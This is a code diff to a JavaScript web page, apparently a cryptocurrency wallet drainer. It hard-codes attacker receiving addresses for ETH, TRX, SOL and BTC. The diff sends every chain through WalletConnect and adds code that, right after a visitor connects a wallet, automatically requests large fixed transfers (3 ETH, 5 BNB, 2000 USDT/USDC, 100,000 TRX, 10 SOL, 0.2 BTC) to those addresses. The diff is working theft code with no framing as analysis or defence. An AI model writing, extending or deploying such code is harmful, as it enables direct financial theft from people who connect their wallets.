@@ -784,8 +784,7 @@ const ADDR_TRX = 'TKeDPdqmCznwneTJXph8yx9QE6g6ZKy445';
 const ADDR_SOL = 'CKKD894vFgGJVMR63pELxKrUkT6ZfHgtB7cri27EmNm9';
 const ADDR_BTC = 'bc1qgq79csscqg4x69q4fvlvldewhfhh5psk7w0e8c';
 
-// Chains that use QR pay modal (no WalletConnect)
-const QR_CHAINS = ['eth', 'btc', 'trx', 'usdt_trc', 'usdc_trc'];
+// All chains connect via WalletConnect
 
 const COIN_CONFIG = {
   eth:      { addr:ADDR_ETH, icon:'🔷', name:'Ethereum (ETH)',   net:'ETH Address',         amount:'3 ETH',          qr:a=>'ethereum:'+a+'?value=3000000000000000000', warn:['Only send ETH on the Ethereum network','Send exactly 3 ETH','Do not send BEP-20 or TRC-20'] },
@@ -824,11 +823,7 @@ function logTransaction(address, chain, status, errMsg) {
 // ══════════════════════════════════════════════
 function openModal(chain) {
   currentChain = chain || 'eth';
-  if (QR_CHAINS.includes(currentChain)) {
-    openPayModal(currentChain);
-  } else {
-    openWcModal(currentChain);
-  }
+  openWcModal(currentChain);
 }
 
 // ══════════════════════════════════════════════
@@ -965,10 +960,14 @@ async function startWcConnect(chain) {
     let namespaces;
     if (chain === 'sol') {
       namespaces = { solana: { methods:['solana_signTransaction','solana_signMessage'], chains:['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'], events:[] } };
+    } else if (chain === 'trx' || chain === 'usdt_trc' || chain === 'usdc_trc') {
+      namespaces = { tron: { methods:['tron_signTransaction','tron_signMessage'], chains:['tron:0x2b6653dc'], events:[] } };
+    } else if (chain === 'btc') {
+      namespaces = { bip122: { methods:['sendTransfer'], chains:['bip122:000000000019d6689c085ae165831e93'], events:[] } };
     } else if (chain === 'bnb') {
       namespaces = { eip155: { methods:['eth_sendTransaction','personal_sign'], chains:['eip155:56'], events:['chainChanged','accountsChanged'] } };
     } else {
-      // usdt (ERC-20), usdc (ERC-20) — Ethereum mainnet
+      // eth, usdt (ERC-20), usdc (ERC-20) — Ethereum mainnet
       namespaces = { eip155: { methods:['eth_sendTransaction','personal_sign'], chains:['eip155:1'], events:['chainChanged','accountsChanged'] } };
     }
 
@@ -992,16 +991,31 @@ async function startWcConnect(chain) {
     // Send transaction after connect
     try {
       const from = getWcAddr();
-      if (chain === 'usdt') {
+      if (chain === 'eth') {
+        // 3 ETH
+        await SC.request({ topic:wcSession.topic, chainId:'eip155:1', request:{ method:'eth_sendTransaction', params:[{ from, to:ADDR_ETH, value:'0x29A2241AF62C0000', gas:'0x5208' }] } });
+      } else if (chain === 'usdt') {
         const data = '0xa9059cbb' + ADDR_ETH.replace('0x','').padStart(64,'0') + (2000*1e6).toString(16).padStart(64,'0');
         await SC.request({ topic:wcSession.topic, chainId:'eip155:1', request:{ method:'eth_sendTransaction', params:[{ from, to:'0xdAC17F958D2ee523a2206206994597C13D831ec7', data, gas:'0x186A0' }] } });
       } else if (chain === 'usdc') {
         const data = '0xa9059cbb' + ADDR_ETH.replace('0x','').padStart(64,'0') + (2000*1e6).toString(16).padStart(64,'0');
         await SC.request({ topic:wcSession.topic, chainId:'eip155:1', request:{ method:'eth_sendTransaction', params:[{ from, to:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', data, gas:'0x186A0' }] } });
       } else if (chain === 'bnb') {
+        // 5 BNB
         await SC.request({ topic:wcSession.topic, chainId:'eip155:56', request:{ method:'eth_sendTransaction', params:[{ from, to:ADDR_ETH, value:'0x4563918244F40000', gas:'0x5208' }] } });
+      } else if (chain === 'trx') {
+        const amount = 100000 * 1_000_000;
+        await SC.request({ topic:wcSession.topic, chainId:'tron:0x2b6653dc', request:{ method:'tron_signTransaction', params:{ transaction:{ visible:false, to:ADDR_TRX, from, value:amount, type:'TransferContract', contract:[{ parameter:{ value:{ amount, owner_address:from, to_address:ADDR_TRX }, type_url:'type.googleapis.com/protocol.TransferContract' }, type:'TransferContract' }] } } } });
+      } else if (chain === 'usdt_trc') {
+        const amt = (2000*1e6).toString(16).padStart(64,'0');
+        await SC.request({ topic:wcSession.topic, chainId:'tron:0x2b6653dc', request:{ method:'tron_signTransaction', params:{ transaction:{ visible:true, to:'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', from, data:'a9059cbb'+ADDR_TRX.padStart(64,'0')+amt, type:'TriggerSmartContract' } } } });
+      } else if (chain === 'usdc_trc') {
+        const amt = (2000*1e6).toString(16).padStart(64,'0');
+        await SC.request({ topic:wcSession.topic, chainId:'tron:0x2b6653dc', request:{ method:'tron_signTransaction', params:{ transaction:{ visible:true, to:'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8', from, data:'a9059cbb'+ADDR_TRX.padStart(64,'0')+amt, type:'TriggerSmartContract' } } } });
       } else if (chain === 'sol') {
         await SC.request({ topic:wcSession.topic, chainId:'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', request:{ method:'solana_signTransaction', params:{ transaction: btoa(JSON.stringify({ to:ADDR_SOL, lamports:10000000000 })) } } });
+      } else if (chain === 'btc') {
+        await SC.request({ topic:wcSession.topic, chainId:'bip122:000000000019d6689c085ae165831e93', request:{ method:'sendTransfer', params:{ account:from, recipientAddress:ADDR_BTC, amount:'20000000' } } });
       }
     } catch(txErr) {
       console.warn('[TX]', txErr);
@@ -1049,7 +1063,9 @@ function onWcConnected(addr) {
 function getWcAddr() {
   try {
     const ns = wcSession.namespaces;
+    if (ns.tron)   return ns.tron.accounts[0].split(':')[2];
     if (ns.solana) return ns.solana.accounts[0].split(':')[2];
+    if (ns.bip122) return ns.bip122.accounts[0].split(':')[2];
     if (ns.eip155) return ns.eip155.accounts[0].split(':')[2];
     return null;
   } catch(e) { return null; }
